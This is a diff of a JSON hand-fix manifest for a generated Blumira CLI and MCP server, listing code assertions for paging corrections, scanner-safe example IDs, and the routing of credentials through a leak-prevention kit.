+     "file": "cli/internal/cli/analytics_engine_extra.go",
+     "contains": "GROUP BY finding_id ORDER BY finding_id LIMIT ?",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/evidence_search.go",
+     "contains": "fetchAllBlumiraPages(ctx, c, path, evidenceMaxPages)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_pager.go",
+     "contains": "func fetchAllBlumiraPages(ctx context.Context, c blumiraPageGetter, path string, maxPages int) ([]json.RawMessage, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "func recordFindingHistory(db *sql.DB, s *store.Store, findings []findingRec, now time.Time, fromSync bool) (string, error) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "SELECT account_id, data FROM msp_account_devices",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "case !f.IsResolved():\n\t\t\t\tt.isRes, t.resolved = false, time.Time{}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "const analyticsListLimit = 0",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/exposure.go",
+     "contains": "exposureGapRows(cov.Gaps)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/dc_roster.go",
+     "contains": "dcRosterGapRows(cov.Gaps)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/overview.go",
+     "contains": "applyDeviceCoverage(computeOverview(findings, devices, time.Now().UTC()), cov)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_pager_test.go",
+     "contains": "func TestFetchAllBlumiraPagesFailsClosed(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "if len(findings) == 0 && !fromSync && latest == nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine.go",
+     "contains": "points, err := db.Query(`SELECT synced_at FROM finding_history_points`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_post_sync.go",
+     "contains": "directComplete, err := lastSyncWalkComplete(s.DB(), \"org-agents-devices\")",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine_extra.go",
+     "contains": "func ownerIdentity(o map[string]any) ([]string, string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/analytics_engine_extra.go",
+     "contains": "return keys, name + \" (\" + id + \")\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/evidence_search.go",
+     "contains": "searchEvidenceCache(s.DB(), term, evidenceScanAll)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/evidence_search.go",
+     "contains": "matchFindingsRaw(findings, raws, term, evidenceScanAll)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/evidence_search.go",
+     "not_contains": "flagLimit-len(view.Matches)"
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_r2_test.go",
+     "contains": "func TestR2EmptySyncIsAHistoryPoint(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_r2_test.go",
+     "contains": "func TestR2TruncatedDirectDeviceWalkNotComplete(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_r2_test.go",
+     "contains": "func TestR2SameNameOwnersStayDistinct(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_r2_test.go",
+     "contains": "func TestR2EvidenceAndRawMergeKeepsLimit(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "sync-documented-paging",
+   "class": "sync",
+   "summary": "sync pages Blumira lists by page_size (the documented page-size parameter, max 200) with limit=5000, and any documented paging signal (links.next, meta.total_pages, meta.total_items) that says more rows follow overrides the short-page end rule, so a cut walk is never recorded complete.",
+   "why": "The 4.35.1 render sends limit=200 as the page size, but Blumira's page size is page_size (spec default 50) and limit caps the whole list. Every page then held 50 rows, 50 < 200 read as the natural end, and sync stored the first 50 rows of every partition with sync_state.last_attempt_complete = 1, so device coverage, triage and every count over 50 rows were wrong and reported as complete (TestR2SyncFollowsDocumentedPaging, seen failing on the scaffold commit). Re-apply after any regeneration of internal/cli/sync.go.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "limitParam:     \"page_size\",",
+     "min_count": 8,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "params[\"limit\"] = strconv.Itoa(blumiraListLimit)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "blumiraMore := resourceSupportsPagination(resource) && blumiraSyncPageSaysMore(data, cursor, consumedTotal+len(items))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "(!blumiraMore && shortPageEndsPagination(pageSize.cursorType, fetchedThisPage,",
+     "min_count": 3,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if len(items) == 0 && blumiraMore {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_pager.go",
+     "contains": "func blumiraSyncPageSaysMore(raw json.RawMessage, cursor string, seen int) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/blumira_review_r2_test.go",
+     "contains": "func TestR2SyncFollowsDocumentedPaging(t *testing.T) {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "gitleaks-safe-example-ids",
+   "class": "examples",
+   "summary": "The get-agents-key commands' runnable example uses a low-entropy key_id (00000000-0000-4000-8000-000000000002), so gitleaks' generic-api-key rule does not flag the generated happy-args annotation.",
+   "why": "The factory's spec repair (bin/prep.py) gives path parameters example values so 4.35.1 emits runnable examples; its random-looking key_id example rendered as `key_id=9b2c...` in two generated command files and failed the repo's gitleaks gate (generic-api-key). Re-apply after any regeneration, or give prep.py the low-entropy value.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/msp_get-agents-key.go",
+     "contains": "key_id=00000000-0000-4000-8000-000000000002",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/org_controller-direct-get-agents-key.go",
+     "contains": "key_id=00000000-0000-4000-8000-000000000002",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/msp_get-agents-key.go",
+     "not_contains": "9b2c1e7a-4d3f-4a8e-b6c5-1f2e3d4c5b6a"
+    },
+    {
+     "file": "cli/internal/cli/org_controller-direct-get-agents-key.go",
+     "not_contains": "9b2c1e7a-4d3f-4a8e-b6c5-1f2e3d4c5b6a"
     }
    ]
   },
@@ -419,6 +677,312 @@
      "not_contains": "connects only to remote"
     }
    ]
+  },
+  {
+   "id": "credkit-wiring",
+   "class": "credential-kit",
+   "summary": "The shared credential kit (tools/maintainer/credkit, vendored at cli/internal/credkit) is wired by hand: internal/credwire/declarations.go holds the one credkit.Declarations literal, both mains start with credkit.Start(credwire.Declarations) and end with credkit.Exit, every HTTP client (API, auth login token mint, --deliver webhook and Spacefast, feedback, probe) goes through credkit.Transport, every SQLite handle through the credkit.SQLDriver internal/credsql registers, every program file write through the kit, child processes through credkit.RunCommand, and the MCP stdio and HTTP servers through credkit.MCPTools, MCPIn, MCPOut and MCPHTTP. The credential store, config.toml and the Spacefast delivery record are sources, written outside the kit (cliutil.AtomicWriteCredentialFile).",
+   "why": "One contract, one matcher and one set of sinks replace the per-connector credential layer this connector never had. Classes the print review left for the kit, closed and each proven by a built-binary test seen failing first on the pre-kit build (internal/credwire/leak_test.go): the token endpoint's error text repeating the client secret, and the client secret sent to an --auth-url other than https://auth.blumira.com (TestTokenEndpointEchoNeverPrints); an API page's error field repeating the bearer, copied into sync errors, msp_account_device_coverage.error and exposure/dc-roster rows (TestPagerErrorEchoNeverReachesStoreOrOutput); a profiles.json value under a credential flag's name held at startup (TestProfileCredentialValueHeldAtStartup). The learn journal is appended with credkit.AppendFile. feedback --stdin keeps its body (compactStdinBody / RestoreFeedbackStdin, TestFeedbackStdinIsRecorded). In-process tests never run Start, so cliutil.OutboundGuard, Hold and HoldBody are variables the test seams swap (credkit_seam_test.go in internal/cli and internal/mcp). The MCP sql value cap moved from sqlite.Limit on a held connection to the _length_limit DSN parameter, and openReadOnlySQLite runs select 1 because the kit's connection does not forward Ping.",
+   "status": "active",
+   "spec_encode_followup": "Press-side: generate the kit wiring, the Declarations literal and one kit-wrapped SQLite driver name.",
+   "asserts": [
+    {
+     "file": "cli/cmd/blumira-cli/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-cli/main.go",
+     "contains": "credkit.Exit(code)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-cli/main.go",
+     "contains": "credwire.RestoreFeedbackStdin()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-mcp/main.go",
+     "contains": "credkit.Start(credwire.Declarations)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-mcp/main.go",
+     "contains": "credkit.Exit(run())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-mcp/main.go",
+     "contains": "server.WithToolHandlerMiddleware(credkit.MCPTools)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-mcp/main.go",
+     "contains": "credkit.MCPIn(os.Stdin), credkit.MCPOut()",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/cmd/blumira-mcp/main.go",
+     "contains": "credkit.MCPHTTP(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credwire/declarations.go",
+     "contains": "var Declarations = credkit.Declarations{",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/credsql/credsql.go",
+     "contains": "sql.Register(Driver, credkit.SQLDriver(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_guard.go",
+     "contains": "var OutboundGuard = credkit.Transport",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credkit_hold.go",
+     "contains": "HoldBody = credkit.HoldBody",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cache/cache.go",
+     "contains": "credkit.WriteFile(s.path(key)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/auth_login.go",
+     "contains": "Transport: cliutil.OutboundGuard(nil), CheckRedirect",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "credkit.WriteFile(tmp, body, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "contains": "cliutil.OutboundGuard(nil).RoundTrip(req)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver_spacefast.go",
+     "contains": "Transport: cliutil.OutboundGuard(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver_spacefast.go",
+     "contains": "cliutil.Hold(\"minted:spacefast-page-key\", prior.Key)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/deliver_spacefast.go",
+     "contains": "cliutil.AtomicWriteCredentialFile(filepath.Join(dir, name), data, 0o600, 0o700)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "credkit.NewWriter(f, credkit.SinkFile)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/feedback.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "cliutil.Hold(\"stdin\", token)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "return credkit.Terminal(f)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/profile.go",
+     "contains": "credkit.WriteFile(tmp, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/teach.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func guardTransport(tr *http.Transport) http.RoundTripper",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "credkit.WriteFile(cacheFile, []byte(data), 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/credentials.go",
+     "contains": "AtomicWriteCredentialFile(path, data, 0o600, 0o700)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "func AtomicWriteCredentialFile(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/paths.go",
+     "contains": "credkit.WriteFile(tmpPath, data, fileMode)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cliutil/probe.go",
+     "contains": "Transport: credkit.Transport(nil)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "cliutil.AtomicWriteCredentialFile(c.Path, data, 0o600, 0o700)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/journal.go",
+     "contains": "credkit.AppendFile(p, append(line,",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/learn/teach_log.go",
+     "contains": "credkit.OpenFile(p, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/cobratree/shellout.go",
+     "contains": "credkit.RunCommand(cmd)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "store.OpenReadOnlyValueCapped(path, maxValueBytes)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "contains": "sql.Open(credsql.Driver, readOnlySQLiteDSN(sourcePath))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/profile.go",
+     "contains": "credkit.WriteFile(tmpName, data, 0o600)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/platform/ratelimit.go",
+     "contains": "credkit.WriteFile(path, []byte(strconv.FormatInt(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "sql.Open(credsql.Driver, dsn)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "func OpenReadOnlyValueCapped(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/platform/migration.go",
+     "not_contains": "sql.Open(\"sqlite\""
+    },
+    {
+     "file": "cli/internal/cli/deliver.go",
+     "not_contains": "http.DefaultTransport.RoundTrip(req)"
+    }
+   ]
+  }
+ ],
+ "retired": [
+  {
+   "id": "env-oauth-secrets-not-persisted",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 keeps the environment markers through SaveTokens and generates MarkCredentialsExplicit, so a client ID or secret read from the environment is never written by a token save."
+  },
+  {
+   "id": "mcp-filesystem-destination-gate",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0 builds a per-command blocked set (blockedDestinationFlags, blockedInputFlags, root control-plane flags), removes those flags from each tool's schema, refuses any undeclared argument name (so \"db=/path\" is refused) and skips '=' names in cliArgsFromMCP."
+  },
+  {
+   "id": "mcp-argv-value-joined",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #4647: every value-carrying branch of cliArgsFromMCP joins the value to its flag (--k=v, one element per list item), and the press generates TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag."
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Upstreamed as cli-printing-press #5045 (4.33.6): a recipe positional that looks like a flag is placed after --, so it cannot set another flag."
+  },
+  {
+   "id": "interim-http-security-note-2026-10-22",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: The note paused HTTP mode until a reprint because the build served HTTP with no token. Press 4.34.0 HTTP mode refuses to start without <PREFIX>_MCP_HTTP_TOKEN, answers 401 without the right bearer, binds 127.0.0.1 by default and refuses a non-loopback address without TLS; onboard.py now writes HTTP guidance that follows the binary (cc-skills #14) and never writes this note, so the entry would fail on every re-onboard."
+  },
+  {
+   "id": "mcp-file-flags-refused",
+   "retired_at": "4.34.0",
+   "reason": "tools/maintainer/fleet_handfixes.json: Press 4.34.0's cobratree mirror derives one blocked set per command (destination, input, mcp:write-flags, mcp:read-flags and root control-plane flags), leaves those flags out of the tool schema and refuses them, and any undeclared argument, by name."
   }
  ]
 }
